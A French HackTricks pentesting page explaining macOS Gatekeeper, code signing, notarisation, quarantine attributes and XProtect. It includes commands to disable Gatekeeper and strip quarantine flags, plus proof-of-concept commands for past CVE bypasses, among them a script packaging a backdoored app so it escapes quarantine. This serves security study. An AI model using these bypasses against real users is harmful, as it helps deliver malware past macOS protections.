# macOS Gatekeeper / Quarantine / XProtect

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)
*
* .

</details>

## Gatekeeper

**Gatekeeper** est une fonctionnalité de sécurité développée pour les systèmes d'exploitation Mac, conçue pour garantir que les utilisateurs **exécutent uniquement des logiciels de confiance** sur leurs systèmes. Il fonctionne en **validant le logiciel** qu'un utilisateur télécharge et tente d'ouvrir à partir de **sources extérieures à l'App Store**, telles qu'une application, un plug-in ou un package d'installation.

Le mécanisme clé de Gatekeeper réside dans son processus de **vérification**. Il vérifie si le logiciel téléchargé est **signé par un développeur reconnu**, garantissant l'authenticité du logiciel. De plus, il vérifie si le logiciel est **notarié par Apple**, confirmant qu'il est exempt de contenu malveillant connu et n'a pas été altéré après la notarisation.

De plus, Gatekeeper renforce le contrôle et la sécurité des utilisateurs en **demandant aux utilisateurs d'approuver l'ouverture** du logiciel téléchargé pour la première fois. Cette mesure de sécurité aide à empêcher les utilisateurs d'exécuter involontairement un code exécutable potentiellement nocif qu'ils auraient pu confondre avec un fichier de données inoffensif.

### Signatures d'application

Les signatures d'application, également appelées signatures de code, sont un élément essentiel de l'infrastructure de sécurité d'Apple. Elles sont utilisées pour **vérifier l'identité de l'auteur du logiciel** (le développeur) et pour s'assurer que le code n'a pas été altéré depuis sa dernière signature.

Voici comment cela fonctionne :

1. **Signature de l'application :** Lorsqu'un développeur est prêt à distribuer son application, il **signe l'application à l'aide d'une clé privée**. Cette clé privée est associée à un **certificat qu'Apple délivre au développeur** lors de son inscription au programme Apple Developer. Le processus de signature implique la création d'un hachage cryptographique de toutes les parties de l'application et le cryptage de ce hachage avec la clé privée du développeur.
2. **Distribution de l'application :** L'application signée est ensuite distribuée aux utilisateurs avec le certificat du développeur, qui contient la clé publique correspondante.
3. **Vérification de l'application :** Lorsqu'un utilisateur télécharge et tente d'exécuter l'application, son système d'exploitation Mac utilise la clé publique du certificat du développeur pour décrypter le hachage. Il recalcule ensuite le hachage en fonction de l'état actuel de l'application et le compare avec le hachage décrypté. S'ils correspondent, cela signifie que **l'application n'a pas été modifiée** depuis la signature du développeur, et le système autorise l'exécution de l'application.

Les signatures d'application sont une partie essentielle de la technologie Gatekeeper d'Apple. Lorsqu'un utilisateur tente d'**ouvrir une application téléchargée depuis Internet**, Gatekeeper vérifie la signature de l'application. Si elle est signée avec un certificat délivré par Apple à un développeur connu et que le code n'a pas été altéré, Gatekeeper autorise l'exécution de l'application. Sinon, il bloque l'application et alerte l'utilisateur.

À partir de macOS Catalina, **Gatekeeper vérifie également si l'application a été notariée** par Apple, ajoutant une couche de sécurité supplémentaire. Le processus de notarisation vérifie l'application pour détecter les problèmes de sécurité connus et le code malveillant, et si ces vérifications sont réussies, Apple ajoute un ticket à l'application que Gatekeeper peut vérifier.

#### Vérification des signatures

Lors de la vérification d'un **échantillon de logiciel malveillant**, vous devriez toujours **vérifier la signature** du binaire car le **développeur** qui l'a signé pourrait déjà être **lié** à un **logiciel malveillant**.
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notarisation

Le processus de notarisation d'Apple sert de sauvegarde supplémentaire pour protéger les utilisateurs des logiciels potentiellement nuisibles. Il implique que le **développeur soumette son application pour examen** par le **Service de notarisation d'Apple**, qui ne doit pas être confondu avec l'App Review. Ce service est un **système automatisé** qui examine le logiciel soumis à la recherche de **contenu malveillant** et de tout problème potentiel lié à la signature de code.

Si le logiciel **passe** cette inspection sans soulever de préoccupations, le Service de notarisation génère un ticket de notarisation. Le développeur est alors tenu de **joindre ce ticket à son logiciel**, un processus appelé 'agrafage'. De plus, le ticket de notarisation est également publié en ligne où Gatekeeper, la technologie de sécurité d'Apple, peut y accéder.

Lors de la première installation ou exécution du logiciel par l'utilisateur, l'existence du ticket de notarisation - qu'il soit agrafé à l'exécutable ou trouvé en ligne - **informe Gatekeeper que le logiciel a été notarisé par Apple**. En conséquence, Gatekeeper affiche un message descriptif dans la boîte de dialogue de lancement initial, indiquant que le logiciel a été vérifié pour son contenu malveillant par Apple. Ce processus renforce ainsi la confiance des utilisateurs dans la sécurité des logiciels qu'ils installent ou exécutent sur leurs systèmes.

### Énumération de GateKeeper

GateKeeper est à la fois **plusieurs composants de sécurité** qui empêchent l'exécution d'applications non fiables et également **l'un des composants**.

Il est possible de voir le **statut** de GateKeeper avec :
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
Notez que les vérifications de signature de GateKeeper ne sont effectuées que sur les **fichiers avec l'attribut Quarantine**, pas sur chaque fichier.
{% endhint %}

GateKeeper vérifiera si, selon les **préférences et la signature**, un binaire peut être exécuté :

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

La base de données qui conserve cette configuration est située dans **`/var/db/SystemPolicy`**. Vous pouvez vérifier cette base de données en tant que root avec :
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
Notez comment la première règle s'est terminée par "**App Store**" et la deuxième par "**Developer ID**" et que dans l'image précédente, il était **activé pour exécuter des applications de l'App Store et des développeurs identifiés**.\
Si vous **modifiez** ce paramètre en App Store, les règles "**Notarized Developer ID**" disparaîtront.

Il y a aussi des milliers de règles de **type GKE**:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Ce sont des hachages provenant de **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** et **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**

Ou vous pouvez lister les informations précédentes avec:
```bash
sudo spctl --list
```
Les options **`--master-disable`** et **`--global-disable`** de **`spctl`** vont complètement **désactiver** ces vérifications de signature :
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Lorsqu'il est complètement activé, une nouvelle option apparaîtra :

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

Il est possible de **vérifier si une application sera autorisée par GateKeeper** avec :
```bash
spctl --assess -v /Applications/App.app
```
Il est possible d'ajouter de nouvelles règles dans GateKeeper pour autoriser l'exécution de certaines applications avec:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### Fichiers en quarantaine

Lors du **téléchargement** d'une application ou d'un fichier, des **applications macOS** spécifiques telles que les navigateurs web ou les clients de messagerie **attachent un attribut de fichier étendu**, communément appelé le "**drapeau de quarantaine**", au fichier téléchargé. Cet attribut agit comme une mesure de sécurité pour **marquer le fichier** comme provenant d'une source non fiable (Internet) et potentiellement porteur de risques. Cependant, toutes les applications n'attachent pas cet attribut, par exemple, les logiciels clients BitTorrent courants contournent généralement ce processus.

**La présence d'un drapeau de quarantaine signale la fonction de sécurité Gatekeeper de macOS lorsque l'utilisateur tente d'exécuter le fichier**.

Dans le cas où le **drapeau de quarantaine n'est pas présent** (comme pour les fichiers téléchargés via certains clients BitTorrent), les **vérifications de Gatekeeper peuvent ne pas être effectuées**. Ainsi, les utilisateurs doivent faire preuve de prudence lors de l'ouverture de fichiers téléchargés à partir de sources moins sécurisées ou inconnues.

{% hint style="info" %}
**Vérifier** la **validité** des signatures de code est un processus **gourmand en ressources** qui implique la génération de **hachages** cryptographiques du code et de toutes ses ressources groupées. De plus, vérifier la validité du certificat implique de faire une **vérification en ligne** auprès des serveurs d'Apple pour voir s'il a été révoqué après son émission. Pour ces raisons, une vérification complète de la signature de code et de la notarisation est **impraticable à exécuter à chaque fois qu'une application est lancée**.

Par conséquent, ces vérifications ne sont **exécutées que lors de l'exécution d'applications avec l'attribut en quarantaine**.
{% endhint %}

{% hint style="warning" %}
Cet attribut doit être **défini par l'application créant/téléchargeant** le fichier.

Cependant, les fichiers qui sont sandboxés auront cet attribut défini pour chaque fichier qu'ils créent. Et les applications non sandboxées peuvent le définir elles-mêmes, ou spécifier la clé [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) dans le fichier **Info.plist** qui fera que le système définira l'attribut étendu `com.apple.quarantine` sur les fichiers créés.
{% endhint %}

Il est possible de **vérifier son statut et d'activer/désactiver** (nécessite les droits d'administrateur) avec :
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Vous pouvez également **vérifier si un fichier possède l'attribut étendu de quarantaine** avec :
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
Vérifiez la **valeur** des **attributs** **étendus** et découvrez l'application qui a écrit l'attribut de quarantaine avec:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
En fait, un processus "pourrait définir des drapeaux de quarantaine pour les fichiers qu'il crée" (j'ai essayé d'appliquer le drapeau USER\_APPROVED à un fichier créé mais il ne l'applique pas) :

<details>

<summary>Code source pour appliquer les drapeaux de quarantaine</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

Et **supprimez** cet attribut avec :
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
Et trouver tous les fichiers mis en quarantaine avec :

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

Les informations de quarantaine sont également stockées dans une base de données centrale gérée par LaunchServices dans **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**.

#### **Quarantine.kext**

L'extension du noyau n'est disponible que via le **cache du noyau sur le système**; cependant, vous _pouvez_ télécharger le **Kit de débogage du noyau depuis https://developer.apple.com/**, qui contiendra une version symbolisée de l'extension.

### XProtect

XProtect est une fonctionnalité **anti-logiciels malveillants** intégrée à macOS. XProtect **vérifie toute application lors de son premier lancement ou de sa modification par rapport à sa base de données** de logiciels malveillants connus et de types de fichiers non sécurisés. Lorsque vous téléchargez un fichier via certaines applications, telles que Safari, Mail ou Messages, XProtect analyse automatiquement le fichier. S'il correspond à un logiciel malveillant connu dans sa base de données, XProtect **empêchera le fichier de s'exécuter** et vous alertera de la menace.

La base de données XProtect est **régulièrement mise à jour** par Apple avec de nouvelles définitions de logiciels malveillants, et ces mises à jour sont automatiquement téléchargées et installées sur votre Mac. Cela garantit que XProtect est toujours à jour avec les dernières menaces connues.

Cependant, il convient de noter que **XProtect n'est pas une solution antivirus complète**. Il ne vérifie que pour une liste spécifique de menaces connues et ne réalise pas de balayage à l'accès comme la plupart des logiciels antivirus.

Vous pouvez obtenir des informations sur la dernière mise à jour de XProtect en exécutant :

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect est situé dans un emplacement protégé par SIP à **/Library/Apple/System/Library/CoreServices/XProtect.bundle** et à l'intérieur du bundle, vous pouvez trouver les informations que XProtect utilise :

- **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`** : Autorise le code avec ces cdhashes à utiliser des autorisations héritées.
- **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`** : Liste des plugins et extensions qui sont interdits de chargement via BundleID et TeamID ou indiquant une version minimale.
- **`XProtect.bundle/Contents/Resources/XProtect.yara`** : Règles Yara pour détecter les logiciels malveillants.
- **`XProtect.bundle/Contents/Resources/gk.db`** : Base de données SQLite3 avec les hachages des applications bloquées et des TeamIDs.

Notez qu'il y a une autre application dans **`/Library/Apple/System/Library/CoreServices/XProtect.app`** liée à XProtect qui n'est pas impliquée dans le processus de Gatekeeper.

### Pas Gatekeeper

{% hint style="danger" %}
Notez que Gatekeeper **n'est pas exécuté à chaque fois** que vous exécutez une application, seulement _**AppleMobileFileIntegrity**_ (AMFI) va seulement **vérifier les signatures du code exécutable** lorsque vous exécutez une application qui a déjà été exécutée et vérifiée par Gatekeeper.
{% endhint %}

Par conséquent, il était auparavant possible d'exécuter une application pour la mettre en cache avec Gatekeeper, puis **modifier des fichiers non exécutables de l'application** (comme les fichiers Electron asar ou NIB) et si aucune autre protection n'était en place, l'application était **exécutée** avec les **ajouts malveillants**.

Cependant, maintenant cela n'est plus possible car macOS **empêche la modification des fichiers** à l'intérieur des bundles d'applications. Ainsi, si vous essayez l'attaque [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md), vous constaterez qu'il n'est plus possible de l'exploiter car après avoir exécuté l'application pour la mettre en cache avec Gatekeeper, vous ne pourrez pas modifier le bundle. Et si vous changez par exemple le nom du répertoire Contents en NotCon (comme indiqué dans l'exploit), puis exécutez le binaire principal de l'application pour le mettre en cache avec Gatekeeper, une erreur se produira et l'application ne s'exécutera pas.

## Contournements de Gatekeeper

Toute méthode de contournement de Gatekeeper (parvenir à faire télécharger quelque chose à l'utilisateur et l'exécuter alors que Gatekeeper devrait l'interdire) est considérée comme une vulnérabilité dans macOS. Voici quelques CVE attribués aux techniques qui ont permis de contourner Gatekeeper dans le passé :

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

Il a été observé que si l'**Utilitaire d'archive** est utilisé pour l'extraction, les fichiers avec des **chemins dépassant 886 caractères** ne reçoivent pas l'attribut étendu com.apple.quarantine. Cette situation permet involontairement à ces fichiers de **contourner les vérifications de sécurité de Gatekeeper**.

Consultez le [**rapport original**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) pour plus d'informations.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Lorsqu'une application est créée avec **Automator**, les informations sur ce dont elle a besoin pour s'exécuter se trouvent dans `application.app/Contents/document.wflow` et non dans l'exécutable. L'exécutable est simplement un binaire Automator générique appelé **Stub d'Application Automator**.

Par conséquent, vous pourriez faire en sorte que `application.app/Contents/MacOS/Automator\ Application\ Stub` **pointe avec un lien symbolique vers un autre Stub d'Application Automator dans le système** et il exécutera ce qui se trouve dans `document.wflow` (votre script) **sans déclencher Gatekeeper** car l'exécutable réel n'a pas l'attribut de quarantaine.&#x20;

Exemple de l'emplacement attendu : `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Consultez le [**rapport original**](https://ronmasas.com/posts/bypass-macos-gatekeeper) pour plus d'informations.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

Dans ce contournement, un fichier zip a été créé avec une application commençant à compresser à partir de `application.app/Contents` au lieu de `application.app`. Par conséquent, l'**attribut de quarantaine** a été appliqué à tous les **fichiers de `application.app/Contents`** mais **pas à `application.app`**, c'est ce que Gatekeeper vérifiait, donc Gatekeeper a été contourné car lorsque `application.app` était déclenché, il **n'avait pas l'attribut de quarantaine.**
```bash
zip -r test.app/Contents test.zip
```
Consultez le [**rapport original**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) pour plus d'informations.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Même si les composants sont différents, l'exploitation de cette vulnérabilité est très similaire à la précédente. Dans ce cas, nous allons générer une archive Apple à partir de **`application.app/Contents`** afin que **`application.app` ne reçoive pas l'attribut de quarantaine** lorsqu'il est décompressé par **Archive Utility**.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Consultez le [**rapport original**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) pour plus d'informations.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

Le ACL **`writeextattr`** peut être utilisé pour empêcher quiconque d'écrire un attribut dans un fichier :
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
De plus, le format de fichier **AppleDouble** copie un fichier incluant ses ACEs.

Dans le [**code source**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), il est possible de voir que la représentation textuelle de l'ACL stockée à l'intérieur de l'attribut étendu appelé **`com.apple.acl.text`** va être définie comme ACL dans le fichier décompressé. Ainsi, si vous compressez une application dans un fichier zip avec le format de fichier **AppleDouble** avec un ACL qui empêche l'écriture d'autres xattrs... l'attribut de quarantaine n'est pas défini dans l'application:

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

Consultez le [**rapport original**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) pour plus d'informations.

Notez que cela pourrait également être exploité avec AppleArchives:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

Il a été découvert que **Google Chrome ne définissait pas l'attribut de quarantaine** pour les fichiers téléchargés en raison de certains problèmes internes de macOS.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

Les formats de fichiers AppleDouble stockent les attributs d'un fichier dans un fichier séparé commençant par `._`, ce qui permet de copier les attributs de fichier **entre les machines macOS**. Cependant, il a été remarqué qu'après la décompression d'un fichier AppleDouble, le fichier commençant par `._` **n'était pas doté de l'attribut de quarantaine**.

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

Être capable de créer un fichier sans attribut de quarantaine, il était **possible de contourner Gatekeeper.** L'astuce était de **créer une application de fichier DMG** en utilisant la convention de nom AppleDouble (le commencer par `._`) et de créer un **fichier visible en tant que lien symbolique vers ce fichier caché** sans l'attribut de quarantaine.\
Lorsque le **fichier dmg est exécuté**, comme il n'a pas d'attribut de quarantaine, il **contournera Gatekeeper**.
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### Empêcher la quarantaine xattr

Dans un bundle ".app", si le xattr de quarantaine n'est pas ajouté, **Gatekeeper ne sera pas déclenché** lors de son exécution.
